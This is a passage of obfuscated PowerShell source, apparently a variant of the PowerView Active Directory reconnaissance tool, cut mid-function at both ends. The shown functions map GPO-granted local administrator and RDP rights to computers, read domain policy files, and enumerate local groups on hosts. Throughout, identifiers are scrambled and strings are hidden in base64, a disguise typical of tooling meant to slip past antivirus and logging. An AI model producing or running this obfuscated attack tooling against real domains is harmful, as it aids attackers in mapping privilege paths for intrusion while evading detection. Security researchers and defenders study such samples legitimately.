                        $Object = _____/\/==\/\_/=== @____/\/\_/\/\/=\/ -Identity ${_/\__/====\/\__/\} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                        ${__/=\_/\_/==\/==\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${_/==\____/===\_/\} = New-Object PSObject
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${__/=\_/\_/==\/==\}
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${_/=\/\_/\/\__/==\}
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/=\/===\___/\__/\}
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${_/\/=\/===\/\_/=\}
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.Properties.distinguishedname
                        ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/===\/\/\_/=\__/=}
                        ${_/==\____/===\_/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                        ${_/==\____/===\_/\}
                    }
                }
            }
            _/\____/\____/===\ @____/\/\_/\/\/=\/ -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA'))) -_/=\/==\/==\_/=\/\ ${_/=\/\_/\/\__/==\} | % {
                ForEach (${_/\__/====\/\__/\} in ${__/\_/\__/=\__/=\}) {
                    $Object = _____/\/==\/\_/=== @____/\/\_/\/\/=\/ -Identity ${_/\__/====\/\__/\} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                    ${__/=\_/\_/==\/==\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                    ${_/==\____/===\_/\} = New-Object PSObject
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${__/=\_/\_/==\/==\}
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${_/=\/\_/\/\__/==\}
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/=\/===\___/\__/\}
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${_/\/=\/===\/\_/=\}
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                    ${_/==\____/===\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $_.siteobjectbl
                    ${_/==\____/===\_/\}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                    ${_/==\____/===\_/\}
                }
            }
        }
    }
}
function Get-DomainGPOComputerLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${_____/=\/==\_/\/\/},
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${____/\/\_/\/\/=\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            ${/=\/===\_____/\__} = __/\/\/=\/\_/==\/\ @____/\/\_/\/\/=\/ -Identity ${_____/=\/==\_/\/\/} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
            if (-not ${/=\/===\_____/\__}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAEMAbwBtAHAAdQB0AGUAcgBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcAXQAgAEMAbwBtAHAAdQB0AGUAcgAgACQAewBfAF8AXwBfAF8ALwA9AFwALwA9AD0AXABfAC8AXAAvAFwALwB9ACAAbgBvAHQAIABmAG8AdQBuAGQALgAgAFQAcgB5ACAAYQAgAGYAdQBsAGwAeQAgAHEAdQBhAGwAaQBmAGkAZQBkACAAaABvAHMAdAAgAG4AYQBtAGUALgA=')))
            }
            ForEach (${/\_______/\/\/=\/} in ${/=\/===\_____/\__}) {
                ${_/==\/==\_/\/\___} = @()
                ${___/=\____/=\/\__} = ${/\_______/\/\/=\/}.distinguishedname
                ${/===\_/\/\/======} = ${___/=\____/=\/\__}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))
                if (${/===\_/\/\/======} -gt 0) {
                    ${/=\/==\_/=\/=\/==} = ${___/=\____/=\/\__}.SubString(${/===\_/\/\/======})
                }
                if (${/=\/==\_/=\/=\/==}) {
                    ${_/==\/==\_/\/\___} += _/====\/\/\/\/\/=\ @____/\/\_/\/\/=\/ -SearchBase ${/=\/==\_/=\/=\/==} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | % {
                        sls -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | % {$_.Matches | select -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $(${/\_______/\/\/=\/}.dnshostname)"
                ${_/==\/=\_/\_/=\_/} = (_/==\/==\/\/\__/\_ -/=\/\/\/=\__/\_/= ${/\_______/\/\/=\/}.dnshostname).SiteName
                if (${_/==\/=\_/\_/=\_/} -and (${_/==\/=\_/\_/=\_/} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))))) {
                    ${_/==\/==\_/\/\___} += _/\____/\____/===\ @____/\/\_/\/\/=\/ -Identity ${_/==\/=\_/\_/=\_/} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | % {
                        sls -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | % {$_.Matches | select -ExpandProperty Value }
                    }
                }
                ${_/==\/==\_/\/\___} | __/\/=\/\/=\/===== @____/\/\_/\/\/=\/ | sort -Property GPOName -Unique | % {
                    ${_/\___/\_/\_/====} = $_
                    if(${_/\___/\_/\_/====}.GroupMembers) {
                        ${/=\/\/=\_/\/=\/\_} = ${_/\___/\_/\_/====}.GroupMembers
                    }
                    else {
                        ${/=\/\/=\_/\/=\/\_} = ${_/\___/\_/\_/====}.GroupSID
                    }
                    ${/=\/\/=\_/\/=\/\_} | % {
                        $Object = _____/\/==\/\_/=== @____/\/\_/\/\/=\/ -Identity $_
                        ${__/=\_/\_/==\/==\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${_/==\/=\/=\__/==\} = New-Object PSObject
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}.dnshostname
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${__/=\_/\_/==\/==\}
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${_/\___/\_/\_/====}.GPODisplayName
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${_/\___/\_/\_/====}.GPOName
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${_/\___/\_/\_/====}.GPOPath
                        ${_/==\/=\/=\__/==\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${_/\___/\_/\_/====}.GPOType
                        ${_/==\/=\/=\__/==\}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBDAG8AbQBwAHUAdABlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                        ${_/==\/=\/=\__/==\}
                    }
                }
            }
        }
    }
}
function Get-DomainPolicyData {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=======\/==\_/==} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        if ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = '*'
        }
        elseif ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        elseif (($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA=')))) -or ($Policy -eq 'DC')) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        else {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Policy
        }
        ${/===\/=======\/==} = ____/===\__/=\__/= @_/\/\/\/\___/\/\/
        ForEach (${__/\_/\/==\/\__/=} in ${/===\/=======\/==}) {
            ${/===\/\/\_/\____/} = ${__/\_/\/==\/\__/=}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${_/=\/\/\__/=\/\/\} =  @{
                'GptTmplPath' = ${/===\/\/\_/\____/}
                'OutputObject' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=\/\/\__/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ____/==\/\/\/\__/= @_/=\/\/\__/=\/\/\ | % {
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) ${__/\_/\/==\/\__/=}.name
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${__/\_/\/==\/\__/=}.displayname
                $_
            }
        }
    }
}
function Get-NetLocalGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = ${Env:/=\/\/\/=\__/\_/=},
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${_/\/==\/\_/\_/\/\} = 1
                ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
                ${__/\___/\/======\} = 0
                ${__/\/==\__/=\__/=} = 0
                ${/\_____/\/=\_/==\} = 0
                ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::NetLocalGroupEnum(${/\_______/\/\/=\/}, ${_/\/==\/\_/\_/\/\}, [ref]${/=\_/\/=\/==\/\__}, -1, [ref]${__/\___/\/======\}, [ref]${__/\/==\__/=\__/=}, [ref]${/\_____/\/=\_/==\})
                ${_/=\/\_/\/=\_____/} = ${/=\_/\/=\/==\/\__}.ToInt64()
                if ((${___/=\/\________/} -eq 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                    ${__/\/===\_/\/\/=\} = ${/=\/===\____/=\_/}::GetSize()
                    for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${__/\___/\/======\}); ${_/\/\__/=\/==\/\_}++) {
                        ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                        ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${/=\/===\____/=\_/}
                        ${_/=\/\_/\/=\_____/} = ${/=\/=======\/==\_}.ToInt64()
                        ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${/==\__/=\_/\_/\__}.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ${/==\__/=\_/\_/\__}.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AQQBQAEkA'))))
                        $LocalGroup
                    }
                    $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
                }
            }
            else {
                ${/=\/\__/==\___/=\} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewAvAFwAXwBfAF8AXwBfAF8AXwAvAFwALwBcAC8APQBcAC8AfQAsAGMAbwBtAHAAdQB0AGUAcgA=')))
                ${/=\/\__/==\___/=\}.psbase.children | ? { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | % {
                    $LocalGroup = ([ADSI]$_)
                    ${_/==\/=\/=\/\/\/\} = New-Object PSObject
                    ${_/==\/=\/=\/\/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
